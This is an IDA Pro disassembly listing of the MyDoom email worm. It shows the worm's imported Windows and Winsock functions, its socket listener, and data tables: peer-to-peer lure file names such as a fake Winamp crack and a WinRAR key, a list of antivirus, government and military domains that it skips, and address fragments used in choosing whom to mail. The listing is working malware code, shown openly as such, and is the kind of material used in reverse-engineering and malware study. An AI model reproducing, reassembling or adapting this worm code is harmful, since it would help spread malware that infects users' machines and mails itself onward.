; [00000010 BYTES. COLLAPSED STRUCT _SYSTEMTIME. PRESS KEYPAD "+" TO EXPAND]
; [00000008 BYTES. COLLAPSED STRUCT FILETIME. PRESS KEYPAD "+" TO EXPAND]
; [0000013E BYTES. COLLAPSED STRUCT _WIN32_FIND_DATAA. PRESS KEYPAD "+"	TO EXPAND]
; [00000008 BYTES. COLLAPSED STRUCT timeval. PRESS KEYPAD "+" TO EXPAND]
; [00000104 BYTES. COLLAPSED STRUCT fd_set. PRESS KEYPAD "+" TO	EXPAND]
; [00000190 BYTES. COLLAPSED STRUCT WSAData. PRESS KEYPAD "+" TO EXPAND]

;
; ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
; บ	This file is generated by The Interactive Disassembler (IDA)	    บ
; บ	Copyright (c) 2004 by DataRescue sa/nv,	<ida@datarescue.com>	    บ
; ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
;
; File Name   :	MyDoom.i
; Format      :	Portable executable for	IBM PC (PE)
; Imagebase   :	800000
; Section 1. (virtual address 00001000)
; Virtual size			: 000079EE (  31214.)
; Section size in file		: 00007A00 (  31232.)
; Offset to raw	data for section: 00000400
; Flags	E0040020: Text Executable Readable Writable
; Alignment	: 16 bytes ?
;
; Imports from ADVAPI32
;


unicode		macro page,string,zero
		irpc c,<string>
		db '&c', page
		endm
		ifnb <zero>
		dw zero
		endif
endm

		model flat

; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

; Segment type:	Externs
; _idata
; LONG __stdcall RegSetValueExA(HKEY hKey,LPCSTR lpValueName,DWORD Reserved,DWORD dwType,const BYTE *lpData,DWORD cbData)
		extrn RegSetValueExA:dword ; DATA XREF:	sub_802B02+130r
; LONG __stdcall RegOpenKeyExA(HKEY hKey,LPCSTR	lpSubKey,DWORD ulOptions,REGSAM	samDesired,PHKEY phkResult)
		extrn RegOpenKeyExA:dword ; DATA XREF: sub_802790+EFr
					; sub_802B02+8r ...
; LONG __stdcall RegCreateKeyExA(HKEY hKey,LPCSTR lpSubKey,DWORD Reserved,LPSTR	lpClass,DWORD dwOptions,REGSAM samDesired,LPSECURITY_ATTRIBUTES	lpSecurityAttributes,PHKEY phkResult,LPDWORD lpdwDisposition)
		extrn RegCreateKeyExA:dword ; DATA XREF: sub_802790+12Ar
; LONG __stdcall RegCloseKey(HKEY hKey)
		extrn RegCloseKey:dword	; DATA XREF: sub_802790+137r
					; sub_802790+14Er ...
; LONG __stdcall RegEnumKeyA(HKEY hKey,DWORD dwIndex,LPSTR lpName,DWORD	cbName)
		extrn RegEnumKeyA:dword	; DATA XREF: sub_8069EA+76r
; LONG __stdcall RegQueryValueExA(HKEY hKey,LPCSTR lpValueName,LPDWORD lpReserved,LPDWORD lpType,LPBYTE	lpData,LPDWORD lpcbData)
		extrn RegQueryValueExA:dword ; DATA XREF: sub_804A7D+FDr
					; sub_8069EA+E0r

;
; Imports from KERNEL32
;
; UINT __stdcall GetTempFileNameA(LPCSTR lpPathName,LPCSTR lpPrefixString,UINT uUnique,LPSTR lpTempFileName)
		extrn GetTempFileNameA:dword ; DATA XREF: sub_805A22+32r
					; sub_805AA7+9Ar ...
; BOOL __stdcall WriteFile(HANDLE hFile,LPCVOID	lpBuffer,DWORD nNumberOfBytesToWrite,LPDWORD lpNumberOfBytesWritten,LPOVERLAPPED lpOverlapped)
		extrn WriteFile:dword	; DATA XREF: sub_805316+117r
					; sub_805316+128r ...
; void __stdcall GetSystemTime(LPSYSTEMTIME lpSystemTime)
		extrn GetSystemTime:dword ; DATA XREF: sub_805247+Ar
; HANDLE GetCurrentThread(void)
		extrn GetCurrentThread:dword ; DATA XREF: sub_805158+39r
; BOOL __stdcall SetThreadPriority(HANDLE hThread,int nPriority)
		extrn SetThreadPriority:dword ;	DATA XREF: sub_805158+40r
; UINT __stdcall GetDriveTypeA(LPCSTR lpRootPathName)
		extrn GetDriveTypeA:dword ; DATA XREF: sub_8050B1+6Er
; HGLOBAL __stdcall GlobalAlloc(UINT uFlags,DWORD dwBytes)
		extrn GlobalAlloc:dword	; DATA XREF: sub_8062CA+E4r
; HANDLE __stdcall FindFirstFileA(LPCSTR lpFileName,LPWIN32_FIND_DATAA lpFindFileData)
		extrn FindFirstFileA:dword ; DATA XREF:	sub_804D32+129r
; BOOL __stdcall FindNextFileA(HANDLE hFindFile,LPWIN32_FIND_DATAA lpFindFileData)
		extrn FindNextFileA:dword ; DATA XREF: sub_804D32+14Ar
; BOOL __stdcall FindClose(HANDLE hFindFile)
		extrn FindClose:dword	; DATA XREF: sub_804D32+206r
; DWORD	__stdcall GetFileSize(HANDLE hFile,LPDWORD lpFileSizeHigh)
		extrn GetFileSize:dword	; DATA XREF: sub_80496F+40r
					; sub_805316+D1r ...
; HANDLE __stdcall CreateFileMappingA(HANDLE hFile,LPSECURITY_ATTRIBUTES lpFileMappingAttributes,DWORD flProtect,DWORD dwMaximumSizeHigh,DWORD dwMaximumSizeLow,LPCSTR lpName)
		extrn CreateFileMappingA:dword ; DATA XREF: sub_80496F+50r
; LPVOID __stdcall MapViewOfFile(HANDLE	hFileMappingObject,DWORD dwDesiredAccess,DWORD dwFileOffsetHigh,DWORD dwFileOffsetLow,DWORD dwNumberOfBytesToMap)
		extrn MapViewOfFile:dword ; DATA XREF: sub_80496F+71r
; BOOL __stdcall UnmapViewOfFile(LPCVOID lpBaseAddress)
		extrn UnmapViewOfFile:dword ; DATA XREF: sub_80496F+E2r
; LONG __stdcall InterlockedIncrement(LPLONG lpAddend)
		extrn InterlockedIncrement:dword ; DATA	XREF: sub_8044DC+8r
; LONG __stdcall InterlockedDecrement(LPLONG lpAddend)
		extrn InterlockedDecrement:dword ; DATA	XREF: sub_8044DC+2Fr
; HGLOBAL __stdcall GlobalFree(HGLOBAL hMem)
		extrn GlobalFree:dword	; DATA XREF: sub_80446C+5Dr
					; sub_8062CA+12Ar
; BOOL __stdcall SetEndOfFile(HANDLE hFile)
		extrn SetEndOfFile:dword ; DATA	XREF: sub_807B94+D8r
; DWORD	__stdcall GetEnvironmentVariableA(LPCSTR lpName,LPSTR lpBuffer,DWORD nSize)
		extrn GetEnvironmentVariableA:dword ; DATA XREF: sub_804F46+E5r
; DWORD	GetLastError(void)
		extrn GetLastError:dword ; DATA	XREF: sub_8028E6+A6r
; HANDLE __stdcall CreateMutexA(LPSECURITY_ATTRIBUTES lpMutexAttributes,BOOL bInitialOwner,LPCSTR lpName)
		extrn CreateMutexA:dword ; DATA	XREF: sub_8028E6+A0r
; DWORD	__stdcall GetFileAttributesA(LPCSTR lpFileName)
		extrn GetFileAttributesA:dword ; DATA XREF: sub_80299E+139r
					; sub_802CB2+15r ...
; BOOL __stdcall CopyFileA(LPCSTR lpExistingFileName,LPCSTR lpNewFileName,BOOL bFailIfExists)
		extrn CopyFileA:dword	; DATA XREF: sub_80299E+128r
					; sub_803265+E2r ...
; BOOL __stdcall DeleteFileA(LPCSTR lpFileName)
		extrn DeleteFileA:dword	; DATA XREF: sub_80299E+113r
					; sub_805158+2Ar ...
; BOOL __stdcall CloseHandle(HANDLE hObject)
		extrn CloseHandle:dword	; DATA XREF: sub_80299E+106r
					; sub_804578+D9r ...
; HANDLE __stdcall CreateFileA(LPCSTR lpFileName,DWORD dwDesiredAccess,DWORD dwShareMode,LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD dwCreationDisposition,DWORD dwFlagsAndAttributes,HANDLE hTemplateFile)
		extrn CreateFileA:dword	; DATA XREF: sub_80299E+F6r
					; sub_8048A0+23r ...
; BOOL __stdcall SetFileAttributesA(LPCSTR lpFileName,DWORD dwFileAttributes)
		extrn SetFileAttributesA:dword ; DATA XREF: sub_80299E+D9r
; int __stdcall	lstrlenA(LPCSTR	lpString)
		extrn lstrlenA:dword	; DATA XREF: sub_80299E+A2r
					; sub_802B02+11Dr ...
; DWORD	__stdcall GetTempPathA(DWORD nBufferLength,LPSTR lpBuffer)
		extrn GetTempPathA:dword ; DATA	XREF: sub_80299E+89r
					; sub_805A22+17r ...
; UINT __stdcall GetWindowsDirectoryA(LPSTR lpBuffer,UINT uSize)
		extrn GetWindowsDirectoryA:dword ; DATA	XREF: sub_80299E+7Br
					; sub_804F46+D8r ...
; LPSTR	__stdcall lstrcatA(LPSTR lpString1,LPCSTR lpString2)
		extrn lstrcatA:dword	; DATA XREF: sub_80299E+61r
					; sub_80299E+C1r ...
; LPSTR	__stdcall lstrcpyA(LPSTR lpString1,LPCSTR lpString2)
		extrn lstrcpyA:dword	; DATA XREF: sub_80299E+4Br
					; sub_80299E+5Fr ...
; DWORD	__stdcall GetModuleFileNameA(HMODULE hModule,LPSTR lpFilename,DWORD nSize)
		extrn GetModuleFileNameA:dword ; DATA XREF: sub_80299E+42r
					; sub_803352+17r ...
; void __stdcall ExitThread(DWORD dwExitCode)
		extrn ExitThread:dword	; DATA XREF: sub_802C72+39r
					; sub_8044DC+37r ...
; void __stdcall Sleep(DWORD dwMilliseconds)
		extrn Sleep:dword	; DATA XREF: sub_802CB2+59r
					; sub_802CB2+88r ...
; HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,DWORD dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,LPVOID	lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId)
		extrn CreateThread:dword ; DATA	XREF: sub_802CB2+41r
					; sub_802CB2+55r ...
; void __stdcall ExitProcess(UINT uExitCode)
		extrn ExitProcess:dword	; DATA XREF: start+44r
; DWORD	__stdcall GetTimeZoneInformation(LPTIME_ZONE_INFORMATION lpTimeZoneInformation)
		extrn GetTimeZoneInformation:dword ; DATA XREF:	sub_802DB3+40r
; BOOL __stdcall FileTimeToSystemTime(const FILETIME *lpFileTime,LPSYSTEMTIME lpSystemTime)
		extrn FileTimeToSystemTime:dword ; DATA	XREF: sub_802DB3+32r
; BOOL __stdcall FileTimeToLocalFileTime(const FILETIME	*lpFileTime,LPFILETIME lpLocalFileTime)
		extrn FileTimeToLocalFileTime:dword ; DATA XREF: sub_802DB3+24r
; void __stdcall GetLocalTime(LPSYSTEMTIME lpSystemTime)
		extrn GetLocalTime:dword ; DATA	XREF: sub_802DB3+15r
; DWORD	GetTickCount(void)
		extrn GetTickCount:dword ; DATA	XREF: sub_802E90r
					; sub_803382+26r ...
; int __stdcall	WideCharToMultiByte(UINT CodePage,DWORD	dwFlags,LPCWSTR	lpWideCharStr,int cchWideChar,LPSTR lpMultiByteStr,int cchMultiByte,LPCSTR lpDefaultChar,LPBOOL	lpUsedDefaultChar)
		extrn WideCharToMultiByte:dword	; DATA XREF: sub_802FA0+BAr
; FARPROC __stdcall GetProcAddress(HMODULE hModule,LPCSTR lpProcName)
		extrn GetProcAddress:dword ; DATA XREF:	sub_803108+58r
					; sub_80399E+27r ...
; HMODULE __stdcall LoadLibraryA(LPCSTR	lpLibFileName)
		extrn LoadLibraryA:dword ; DATA	XREF: sub_803108+48r
					; sub_80399E+17r ...
; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
		extrn GetModuleHandleA:dword ; DATA XREF: sub_803108+3Ar
					; sub_80399E+Ar ...
; BOOL __stdcall ReadFile(HANDLE hFile,LPVOID lpBuffer,DWORD nNumberOfBytesToRead,LPDWORD lpNumberOfBytesRead,LPOVERLAPPED lpOverlapped)
		extrn ReadFile:dword	; DATA XREF: sub_80317F+1Dr
					; sub_80317F+31r ...
; DWORD	__stdcall SetFilePointer(HANDLE	hFile,LONG lDistanceToMove,PLONG lpDistanceToMoveHigh,DWORD dwMoveMethod)
		extrn SetFilePointer:dword ; DATA XREF:	sub_80317F+Br
					; sub_80317F+18r ...
; int __stdcall	lstrcmpiA(LPCSTR lpString1,LPCSTR lpString2)
		extrn lstrcmpiA:dword	; DATA XREF: sub_80418A+45r
					; sub_80431F+11r ...
; HANDLE GetProcessHeap(void)
		extrn GetProcessHeap:dword ; DATA XREF:	sub_80357F+Ar
					; sub_80359E+E6r ...
; LPVOID __stdcall HeapAlloc(HANDLE hHeap,DWORD	dwFlags,DWORD dwBytes)
		extrn HeapAlloc:dword	; DATA XREF: sub_80359E+EDr
					; sub_8036E5+24r ...
; LPSTR	__stdcall lstrcpynA(LPSTR lpString1,LPCSTR lpString2,int iMaxLength)
		extrn lstrcpynA:dword	; DATA XREF: sub_80399E+98r
					; sub_804253+6Fr ...
; int __stdcall	lstrcmpA(LPCSTR	lpString1,LPCSTR lpString2)
		extrn lstrcmpA:dword	; DATA XREF: sub_804059+5Cr
; BOOL __stdcall HeapFree(HANDLE hHeap,DWORD dwFlags,LPVOID lpMem)
		extrn HeapFree:dword	; DATA XREF: sub_80357F+11r
					; sub_8036E5+1EFr ...

;
; Imports from MSVCRT
;
; void *__cdecl	_imp_memset(void *,int,size_t)
		extrn __imp_memset:dword ; DATA	XREF: memsetr
; int __cdecl tolower(int)
		extrn tolower:dword	; DATA XREF: sub_802F26+Dr
					; sub_802F26+23r ...
; void *__cdecl	_imp_memcpy(void *,const void *,size_t)
		extrn __imp_memcpy:dword ; DATA	XREF: memcpyr
; int __cdecl isdigit(int)
		extrn isdigit:dword	; DATA XREF: sub_802FA0+3Ar
; char *__cdecl	strchr(const char *,int)
		extrn strchr:dword	; DATA XREF: sub_803B98+6Cr
					; sub_803B98+105r ...
; int __cdecl isalnum(int)
		extrn isalnum:dword	; DATA XREF: sub_803B98+3Br
					; sub_803B98+90r ...
; int __cdecl isspace(int)
		extrn isspace:dword	; DATA XREF: sub_803B98+2Br
					; sub_803B98+F0r ...
; size_t __cdecl _imp_strlen(const char	*)
		extrn __imp_strlen:dword ; DATA	XREF: strlenr
; char *__cdecl	_imp_strcpy(char *,const char *)
		extrn __imp_strcpy:dword ; DATA	XREF: strcpyr
; char *__cdecl	strstr(const char *,const char *)
		extrn strstr:dword	; DATA XREF: sub_804D32+56r
					; sub_804D32+68r ...
; void *__cdecl	malloc(size_t)
		extrn malloc:dword	; DATA XREF: sub_8051BC+Er
					; sub_8071E7+86r ...
; char *__cdecl	_imp_strcat(char *,const char *)
		extrn __imp_strcat:dword ; DATA	XREF: strcatr
; void *__cdecl	realloc(void *,size_t)
		extrn realloc:dword	; DATA XREF: sub_80733B+50r
		extrn fclose:dword	; DATA XREF: sub_807400+92r
					; sub_8074A2+88r ...
		extrn fread:dword	; DATA XREF: sub_807400+29r
					; sub_807400+38r ...
		extrn fopen:dword	; DATA XREF: sub_807400+1Ar
					; sub_8074A2+16r ...
; time_t __cdecl time(time_t *)
		extrn time:dword	; DATA XREF: sub_8074A2+95r
					; sub_8075B2+97r ...
		extrn fwrite:dword	; DATA XREF: sub_8074A2+37r
					; sub_8074A2+48r ...
; int __cdecl system(const char	*)
		extrn system:dword	; DATA XREF: sub_8075B2+208r
; int __cdecl _imp_memcmp(const	void *,const void *,size_t)
		extrn __imp_memcmp:dword ; DATA	XREF: memcmpr
; void __cdecl free(void *)
		extrn free:dword	; DATA XREF: sub_80783E+22r
					; sub_807D81+114r

;
; Imports from USER32
;
; DWORD	__stdcall CharUpperBuffA(LPSTR lpsz,DWORD cchLength)
		extrn CharUpperBuffA:dword ; DATA XREF:	sub_805729+1A4r
					; sub_8058E5+E9r
; LPSTR	__stdcall CharUpperA(LPSTR lpsz)
		extrn CharUpperA:dword	; DATA XREF: sub_805729+1B2r
					; sub_8058E5+FDr
; LPSTR	__stdcall CharLowerA(LPSTR lpsz)
		extrn CharLowerA:dword	; DATA XREF: sub_804BB6+52r
					; sub_804D32+50r ...
; int __stdcall	wvsprintfA(LPSTR,LPCSTR,va_list	arglist)
		extrn wvsprintfA:dword	; DATA XREF: sub_8066C8+1Dr
; int wsprintfA(LPSTR,LPCSTR,...)
		extrn wsprintfA:dword	; DATA XREF: sub_802DB3+CEr
					; sub_805729+180r ...
; HWND __stdcall FindWindowA(LPCSTR lpClassName,LPCSTR lpWindowName)
		extrn FindWindowA:dword	; DATA XREF: sub_802C72+1r
					; sub_802C72+Er ...
; BOOL __stdcall PostMessageA(HWND hWnd,UINT Msg,WPARAM	wParam,LPARAM lParam)
		extrn PostMessageA:dword ; DATA	XREF: sub_802C46+Dr
					; sub_802C46+18r ...

;
; Imports from WS2_32
;
; int __stdcall	bind(SOCKET s,const struct sockaddr *name,int namelen)
		extrn bind:dword	; DATA XREF: sub_807D81+6Ar
; int __stdcall	listen(SOCKET s,int backlog)
		extrn listen:dword	; DATA XREF: sub_807D81+B7r
; SOCKET __stdcall accept(SOCKET s,struct sockaddr *addr,int *addrlen)
		extrn accept:dword	; DATA XREF: sub_807D81+FEr
; u_long __stdcall htonl(u_long	hostlong)
		extrn htonl:dword	; DATA XREF: sub_807400+73r
					; sub_8074A2+27r ...
; u_long __stdcall ntohl(u_long	netlong)
		extrn ntohl:dword	; DATA XREF: sub_80733B+6r
					; sub_807400+40r ...
; int __stdcall	connect(SOCKET s,const struct sockaddr *name,int namelen)
		extrn connect:dword	; DATA XREF: sub_806765+BEr
					; sub_807983+30r
; int __stdcall	send(SOCKET s,const char *buf,int len,int flags)
		extrn send:dword	; DATA XREF: sub_8066C8+3Dr
					; sub_806765+1CDr ...
; unsigned __int32 __stdcall inet_addr(const char *cp)
		extrn inet_addr:dword	; DATA XREF: sub_803B61-65r
					; sub_8064B7+2r
; struct hostent *__stdcall gethostbyname(const	char *name)
		extrn gethostbyname:dword ; DATA XREF: sub_803B61-52r
					; sub_8064B7+19r ...
; SOCKET __stdcall socket(int af,int type,int protocol)
		extrn socket:dword	; DATA XREF: sub_8036E5+3Er
					; sub_806765+9Fr ...
; int __stdcall	select(int nfds,fd_set *readfds,fd_set *writefds,fd_set	*exceptfds,const struct	timeval	*timeout)
		extrn select:dword	; DATA XREF: sub_8036E5+C3r
					; sub_80641A+5Ar
; int __stdcall	recv(SOCKET s,char *buf,int len,int flags)
		extrn recv:dword	; DATA XREF: sub_8036E5+E5r
					; sub_80641A+6Ar ...
; int __stdcall	closesocket(SOCKET s)
		extrn closesocket:dword	; DATA XREF: sub_8036E5+25Fr
					; sub_806765+278r ...
; u_short __stdcall ntohs(u_short netshort)
		extrn ntohs:dword	; DATA XREF: sub_803493+10r
					; sub_803493+17r ...
; u_short __stdcall htons(u_short hostshort)
		extrn htons:dword	; DATA XREF: sub_803382+40r
					; sub_803382:loc_803440r ...
; int __stdcall	sendto(SOCKET s,const char *buf,int len,int flags,const	struct sockaddr	*to,int	tolen)
		extrn sendto:dword	; DATA XREF: sub_803382+FDr
; int __stdcall	WSAStartup(WORD	wVersionRequested,LPWSADATA lpWSAData)
		extrn WSAStartup:dword	; DATA XREF: start+15r
; int __stdcall	gethostname(char *name,int namelen)
		extrn gethostname:dword	; DATA XREF: sub_8028E6+29r
					; sub_8071E7+2Br ...


; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

; Segment type:	Pure code
; Segment permissions: Read/Write/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 8011BCh
		assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
		align 10h
dword_8011C0	dd 8013D8h		; DATA XREF: sub_802DB3+BFr
		dd offset aMon		; "Mon"
		dd offset aTue		; "Tue"
		dd offset aWed		; "Wed"
		dd offset aThu		; "Thu"
		dd offset aFri		; "Fri"
dword_8011D8	dd 8013C0h		; DATA XREF: sub_802DB3+AFr
		dd offset aJan		; "Jan"
		dd offset aFeb		; "Feb"
		dd offset aMar		; "Mar"
		dd offset aApr		; "Apr"
		dd offset aMay		; "May"
		dd offset aJun		; "Jun"
		dd offset aJul		; "Jul"
		dd offset aAug		; "Aug"
		dd offset aSep		; "Sep"
		dd offset aOct		; "Oct"
		dd offset aNov		; "Nov"
		dd offset aDec		; "Dec"
; LPCSTR lpString2
lpString2	dd offset aWinamp5_0En	; DATA XREF: sub_803265+7Cr
					; "Winamp 5.0 (en)"
		dd offset aWinamp5_0EnCra ; "Winamp 5.0	(en) Crack"
		dd offset aWinrar_v_3_2_a ; "WinRAR.v.3.2.and.key"
		dd offset aIcq4Lite	; "ICQ 4 Lite"
		dd offset aHarryPotter	; "Harry Potter"
		dd offset aKazaaLite	; "Kazaa Lite"
		dd offset aIndex	; "index"
dword_801228	dd 801718h		; DATA XREF: sub_803FD5+4Br
					; sub_803FD5+55o
		dd offset aSyma		; "syma"
		dd offset aSarc_	; "sarc."
		dd offset aMicrosoft	; "microsoft"
		dd offset aMsn_		; "msn."
		dd offset aHotmail	; "hotmail"
		dd offset aPanda	; "panda"
		dd offset aSpersk	; "spersk"
		dd offset aOphos	; "ophos"
		dd offset aExample	; "example"
		dd offset aDomain	; "domain"
		dd offset aUslis	; "uslis"
		dd offset aUpdate	; "update"
		dd offset a_gov		; ".gov"
		dd offset aGov_		; "gov."
		dd offset a_mil		; ".mil"
		dd offset aFoo_		; "foo."
		dd offset aBar_		; "bar."
		dd offset aLabs		; "labs"
		dd offset aMath		; "math"
		dd offset aSecur	; "secur"
		dd offset aSeclist	; "seclist"
		dd offset aGmail	; "gmail"
		dd offset aGnu_		; "gnu."
		dd offset aGoogle	; "google"
		dd offset aArin_	; "arin."
		dd offset aRipe_	; "ripe."
		dd offset aSourceforge	; "sourceforge"
		dd offset aSf_net	; "sf.net"
		dd offset aRarsoft	; "rarsoft"
		dd offset aWinzip	; "winzip"
		align 8
dword_8012A8	dd 801618h		; DATA XREF: sub_804059+44r
					; sub_804059+4Co
		dd offset aInfo		; "info"
		dd offset aNoone	; "noone"
		dd offset aNobody	; "nobody"
		dd offset aNothing	; "nothing"
		dd offset aAnyone	; "anyone"
		dd offset aSomeone	; "someone"
		dd offset aYour		; "your"
		dd offset aYou		; "you"
		dd offset aMe		; "me"
		dd offset aRating	; "rating"
		dd offset aSite		; "site"
		dd offset aContact	; "contact"
		dd offset aSoft		; "soft"
		dd offset aNo		; "no"
		dd offset aService	; "service"
		dd offset aHelp		; "help"
		dd offset aNot		; "not"
		dd offset aFeste	; "feste"
		dd offset aCa		; "ca"
		dd offset aGoldCerts	; "gold-certs"
		dd offset aThe_bat	; "the.bat"
		dd offset aPage		; "page"
		align 8
dword_801308	dd 801570h		; DATA XREF: sub_804059+89r
					; sub_804059+91o
		dd offset aCrosoft	; "crosoft"
		dd offset aSuppor	; "suppor"
		dd offset aNtivi	; "ntivi"
		dd offset aSubmit	; "submit"
		dd offset aListserv	; "listserv"
		dd offset aBug		; "bug"
		dd offset aSecur	; "secur"
		dd offset aPrivacycertifi ; "privacycertific"
		dd offset aAccoun	; "accoun"
		dd offset aSample	; "sample"
		dd offset aMaster	; "master"
		dd offset aAbus		; "abus"
		dd offset aSpam		; "spam"
		dd 0
; LPCSTR off_801344
off_801344	dd offset aJohn		; DATA XREF: sub_804253+8Ar
					; "john"
		dd offset aJames	; "james"
		dd offset aSales	; "sales"
; LPCSTR lpFileName
lpFileName	dd offset aCS		; DATA XREF: sub_805158+1r
					; sub_805158+18r ...
					; "c:\\s"
		align 10h
; char String2[]
String2		db '\',0                ; DATA XREF: sub_80299E+BBo
					; sub_803265+60o ...
		align 4
; char aIeframe[]
aIeframe	db 'IEFrame',0          ; DATA XREF: sub_802C72+29o
; char aAth_note[]
aAth_note	db 'ATH_Note',0         ; DATA XREF: sub_802C72+19o
		align 4
; char ClassName[]
ClassName	db 'rctrl_renwnd32',0   ; DATA XREF: sub_802C72+9o
		align 4
aCS		db 'c:\s',0             ; DATA XREF: .text:lpFileNameo
					; sub_802CB2+Eo
		align 10h
aDec		db 'Dec',0              ; DATA XREF: .text:00801208o
aNov		db 'Nov',0              ; DATA XREF: .text:00801204o
aOct		db 'Oct',0              ; DATA XREF: .text:00801200o
aSep		db 'Sep',0              ; DATA XREF: .text:008011FCo
aAug		db 'Aug',0              ; DATA XREF: .text:008011F8o
aJul		db 'Jul',0              ; DATA XREF: .text:008011F4o
aJun		db 'Jun',0              ; DATA XREF: .text:008011F0o
aMay		db 'May',0              ; DATA XREF: .text:008011ECo
aApr		db 'Apr',0              ; DATA XREF: .text:008011E8o
aMar		db 'Mar',0              ; DATA XREF: .text:008011E4o
aFeb		db 'Feb',0              ; DATA XREF: .text:008011E0o
aJan		db 'Jan',0              ; DATA XREF: .text:008011DCo
aSat		db 'Sat',0
aFri		db 'Fri',0              ; DATA XREF: .text:008011D4o
aThu		db 'Thu',0              ; DATA XREF: .text:008011D0o
aWed		db 'Wed',0              ; DATA XREF: .text:008011CCo
aTue		db 'Tue',0              ; DATA XREF: .text:008011C8o
aMon		db 'Mon',0              ; DATA XREF: .text:008011C4o
aSun		db 'Sun',0
; char aSUSU_2u_2u_2uC[]
aSUSU_2u_2u_2uC	db '%s, %u %s %u %.2u:%.2u:%.2u %c%.2u%.2u',0 ; DATA XREF: sub_802DB3+C6o
		align 4
; char ProcName[]
ProcName	db 'InternetGetConnectedState',0 ; DATA XREF: sub_803108:loc_80315Ao
		align 10h
aIndex		db 'index',0            ; DATA XREF: .text:00801224o
		align 4
aKazaaLite	db 'Kazaa Lite',0       ; DATA XREF: .text:00801220o
		align 4
aHarryPotter	db 'Harry Potter',0     ; DATA XREF: .text:0080121Co
		align 4
aIcq4Lite	db 'ICQ 4 Lite',0       ; DATA XREF: .text:00801218o
		align 10h
aWinrar_v_3_2_a	db 'WinRAR.v.3.2.and.key',0 ; DATA XREF: .text:00801214o
		align 4
aWinamp5_0EnCra	db 'Winamp 5.0 (en) Crack',0 ; DATA XREF: .text:00801210o
		align 10h
aWinamp5_0En	db 'Winamp 5.0 (en)',0  ; DATA XREF: .text:lpString2o
; char aExe[]
aExe		db 'exe',0              ; DATA XREF: sub_803265:loc_80332Do
aCom		db 'com',0              ; DATA XREF: sub_803265:loc_803326o
aSharereactor_c	db 'ShareReactor.com',0 ; DATA XREF: sub_803265:loc_80331Fo
		align 4
aScr		db 'scr',0              ; DATA XREF: .text:off_801AFCo
					; sub_803265+B3o
; char a__0[]
a__0:					; DATA XREF: sub_803265+8Co
					; sub_805AA7+15Co ...
		unicode	0, <.>,0
; char ModuleName[]
ModuleName	db 'dnsapi.dll',0       ; DATA XREF: sub_80399E+4o
		align 10h
; char aIphlpapi_dll[]
aIphlpapi_dll	db 'iphlpapi.dll',0     ; DATA XREF: sub_803B61-FDo
		align 10h
; char aDnsquery_a[]
aDnsquery_a	db 'DnsQuery_A',0       ; DATA XREF: sub_80399E:loc_8039BFo
		align 4
; char aGetnetworkpara[]
aGetnetworkpara	db 'GetNetworkParams',0 ; DATA XREF: sub_803B61-CFo
		align 10h
aSales		db 'sales',0            ; DATA XREF: .text:0080134Co
		align 4
aJames		db 'james',0            ; DATA XREF: .text:00801348o
		align 10h
aJohn		db 'john',0             ; DATA XREF: .text:off_801344o
		align 4
aSpam		db 'spam',0             ; DATA XREF: .text:0080133Co
		align 10h
aAbus		db 'abus',0             ; DATA XREF: .text:00801338o
		align 4
aMaster		db 'master',0           ; DATA XREF: .text:00801334o
		align 10h
aSample		db 'sample',0           ; DATA XREF: .text:00801330o
		align 4
aAccoun		db 'accoun',0           ; DATA XREF: .text:0080132Co
		align 10h
aPrivacycertifi	db 'privacycertific',0  ; DATA XREF: .text:00801328o
aBug		db 'bug',0              ; DATA XREF: .text:00801320o
aListserv	db 'listserv',0         ; DATA XREF: .text:0080131Co
		align 10h
aSubmit		db 'submit',0           ; DATA XREF: .text:00801318o
		align 4
aNtivi		db 'ntivi',0            ; DATA XREF: .text:00801314o
		align 10h
aSuppor		db 'suppor',0           ; DATA XREF: .text:00801310o
		align 4
aCrosoft	db 'crosoft',0          ; DATA XREF: .text:0080130Co
aAdmi		db 'admi',0
		align 4
aPage		db 'page',0             ; DATA XREF: .text:00801300o
		align 10h
aThe_bat	db 'the.bat',0          ; DATA XREF: .text:008012FCo
aGoldCerts	db 'gold-certs',0       ; DATA XREF: .text:008012F8o
		align 4
aCa		db 'ca',0               ; DATA XREF: .text:008012F4o
		align 4
aFeste		db 'feste',0            ; DATA XREF: .text:008012F0o
		align 10h
aNot		db 'not',0              ; DATA XREF: .text:008012ECo
aHelp		db 'help',0             ; DATA XREF: .text:008012E8o
		align 4
aService	db 'service',0          ; DATA XREF: .text:008012E4o
aNo		db 'no',0               ; DATA XREF: .text:008012E0o
		align 4
aSoft		db 'soft',0             ; DATA XREF: .text:008012DCo
		align 10h
aContact	db 'contact',0          ; DATA XREF: .text:008012D8o
aSite		db 'site',0             ; DATA XREF: .text:008012D4o
		align 10h
aRating		db 'rating',0           ; DATA XREF: .text:008012D0o
		align 4
aMe		db 'me',0               ; DATA XREF: .text:008012CCo
		align 4
aYou		db 'you',0              ; DATA XREF: .text:008012C8o
aYour		db 'your',0             ; DATA XREF: .text:008012C4o
		align 4
aSomeone	db 'someone',0          ; DATA XREF: .text:008012C0o
aAnyone		db 'anyone',0           ; DATA XREF: .text:008012BCo
		align 4
aNothing	db 'nothing',0          ; DATA XREF: .text:008012B8o
aNobody		db 'nobody',0           ; DATA XREF: .text:008012B4o
		align 4
aNoone		db 'noone',0            ; DATA XREF: .text:008012B0o
		align 10h
aInfo		db 'info',0             ; DATA XREF: .text:008012ACo
		align 4
aRoot		db 'root',0
		align 10h
aWinzip		db 'winzip',0           ; DATA XREF: .text:008012A0o
		align 4
aRarsoft	db 'rarsoft',0          ; DATA XREF: .text:0080129Co
aSf_net		db 'sf.net',0           ; DATA XREF: .text:00801298o
		align 4
aSourceforge	db 'sourceforge',0      ; DATA XREF: .text:00801294o
aRipe_		db 'ripe.',0            ; DATA XREF: .text:00801290o
		align 4
aArin_		db 'arin.',0            ; DATA XREF: .text:0080128Co
		align 4
aGoogle		db 'google',0           ; DATA XREF: .text:00801288o
		align 4
aGnu_		db 'gnu.',0             ; DATA XREF: .text:00801284o
		align 4
